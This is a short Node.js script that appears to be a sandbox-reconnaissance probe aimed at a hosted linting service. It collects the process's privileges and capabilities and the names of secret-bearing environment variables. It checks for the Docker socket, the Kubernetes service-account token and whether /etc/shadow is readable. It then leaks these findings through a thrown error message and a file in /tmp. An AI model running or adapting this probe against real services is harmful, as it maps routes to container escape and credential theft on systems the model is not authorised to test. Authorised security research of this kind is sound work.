import fs from "node:fs";

const status = fs.readFileSync("/proc/self/status", "utf8");
const cap = status.match(/^CapEff:\s*(.*)$/m)?.[1] ?? "missing";
const uid = typeof process.getuid === "function" ? process.getuid() : "na";
const gid = typeof process.getgid === "function" ? process.getgid() : "na";
const envKeys = Object.keys(process.env).filter((k) => /AWS|GITHUB|CODACY|K8S|TOKEN|SECRET|CREDENTIAL/i.test(k)).sort();
const tcp = fs.readFileSync("/proc/net/tcp", "utf8").trim().split(/\r?\n/).filter(Boolean).length - 1;
const unix = fs.readFileSync("/proc/net/unix", "utf8").trim().split(/\r?\n/).filter(Boolean).length - 1;
const marker = [
  `uid=${uid}`,
  `gid=${gid}`,
  `cap_eff=${cap}`,
  `rootfs=${fs.readlinkSync("/proc/1/root")}`,
  `docker_sock=${fs.existsSync("/var/run/docker.sock")}`,
  `k8s_token=${fs.existsSync("/var/run/secrets/kubernetes.io/serviceaccount/token")}`,
  `etc_shadow_readable=${fs.existsSync("/etc/shadow") && (() => { try { fs.accessSync("/etc/shadow", fs.constants.R_OK); return true; } catch { return false; } })()}`,
  `root_entries=${(() => { try { return fs.readdirSync("/root").length; } catch { return -1; } })()}`,
  `tcp_entries=${tcp}`,
  `unix_entries=${unix}`,
  `sensitive_env_keys=${envKeys.join(",") || "none"}`
].join(" ");
fs.writeFileSync("/tmp/CODACY_ESLINT9_BOUNDARY_20260714", marker);
throw new Error(`CODACY_ESLINT9_BOUNDARY_MARKER ${marker}`);